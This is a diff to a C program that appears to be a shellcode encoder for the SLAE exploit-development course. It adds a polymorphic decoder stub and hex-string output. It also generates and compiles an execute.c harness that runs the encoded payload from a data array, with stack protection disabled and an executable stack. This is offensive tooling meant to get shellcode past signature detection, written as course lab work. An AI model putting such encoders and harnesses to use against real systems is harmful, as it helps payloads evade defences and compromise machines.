@@ -14,6 +14,14 @@
 
 typedef enum {false, true} bool;
 
+char byte2char(unsigned int b) {
+	if ( (b >= 0x0) && (b <= 0x9) )
+		return (b + '0');
+	if ( (b >= 0xa) && (b <= 0xf) )
+		return (b - 0xa + 'a');
+	return -1;
+}
+
 char char2byte(char c) {
 	if( (c >= '0') && (c <= '9') )
 		return (c - '0');
@@ -236,34 +244,63 @@ int main(int argc, char *argv[]) {
 	printf("[*] Creating polymorphic decoder-stub..\n");
 	char *decoderStub = polymorphicDecoder(key, length);
 
-	printf("[*] Done with decoder-stub of %d bytes and shellcode of %d bytes!\n", strlen(decoderStub), strlen(encodedShellcode));
+	printf("[*] Done encoding with decoder-stub of %d bytes and shellcode of %d bytes!\n", strlen(decoderStub), strlen(encodedShellcode));
 
-	// Print decoder stub
-	printf("[>] Decoder-stub: ");
+	char decoderStub_string[4*strlen(decoderStub) + 1];
+	decoderStub_string[4*strlen(decoderStub)] = '\0';
+	char encodedShellcode_string[4*strlen(encodedShellcode) + 1];
+	encodedShellcode_string[4*strlen(encodedShellcode)] = '\0';
+
 	int i;
-	for(i = 0; i < strlen(decoderStub); i++) {
-		printf("0x%02x", (0xFF & decoderStub[i]));
-		if (i+1 < strlen(decoderStub)) {
-			printf(",");
-		}
-	}
-
-	// Print encoded shellcode
-	printf("\n[>] Shellcode: ");
-	for(i = 0; i < strlen(encodedShellcode); i++) {
-		printf("0x%02x", (0xFF & encodedShellcode[i]));
-		if (i+1 < strlen(encodedShellcode)) {
-			printf(",");
-		}
-	}
-	printf("\nClean code:\n");
         for(i = 0; i < strlen(decoderStub); i++) {
-                printf("\\x%02x", (0xFF & decoderStub[i]));
+		decoderStub_string[4*i + 0] = '\\';
+		decoderStub_string[4*i + 1] = 'x';
+		decoderStub_string[4*i + 2] = byte2char( (decoderStub[i] & 0xf0) >> 4 );
+		decoderStub_string[4*i + 3] = byte2char(decoderStub[i] & 0x0f);
         }
         for(i = 0; i < strlen(encodedShellcode); i++) {
-                printf("\\x%02x", (0xFF & encodedShellcode[i]));
+		encodedShellcode_string[4*i + 0] = '\\';
+		encodedShellcode_string[4*i + 1] = 'x';
+		encodedShellcode_string[4*i + 2] = byte2char( (encodedShellcode[i] & 0xf0) >> 4 );
+		encodedShellcode_string[4*i + 3] = byte2char(encodedShellcode[i] & 0x0f);
         }
 
-	printf("\n");
+	printf("[*] Encoded shellcode:\n     %s%s\n", decoderStub_string, encodedShellcode_string);
+	printf("[*] Creating ./execute.c..\n");
+
+	FILE *fp = fopen("./execute.c", "wab");
+	if (fp == NULL) {
+		printf("[!] Error: Couldn't create ./execute.c!");
+	} else {
+		fprintf(fp, \
+			"// execute.c\n"
+			"// Author: Joris Hartog\n"
+			"// St.nr.: SLAE-704\n"
+			"// Descr.: This program was generated to test\n"
+			"//  the encoded payload.\n"
+			"\n"
+			"#include <stdio.h>\n"
+			"#include <string.h>\n"
+			"\n"
+			"unsigned char code[] = \\\n"
+			"\"%s%s\";\n"
+			"\n"
+			"void main() {\n"
+			"        printf(\"Shellcode length: %%d\\n\", strlen(code));\n"
+			"        int (*ret)() = (int(*)())code;\n"
+			"        ret();\n"
+			"}",
+			decoderStub_string, encodedShellcode_string
+		);
+		fclose(fp);
+	}
+
+	printf("[*] Compiling ./execute.c!\n");
+	printf("     Output file: ./execute\n");
+
+	system("gcc -fno-stack-protector -z execstack -o execute execute.c\n");
+
+	printf("[*] Done! Exiting..\n");
+	return 0;
 }
 
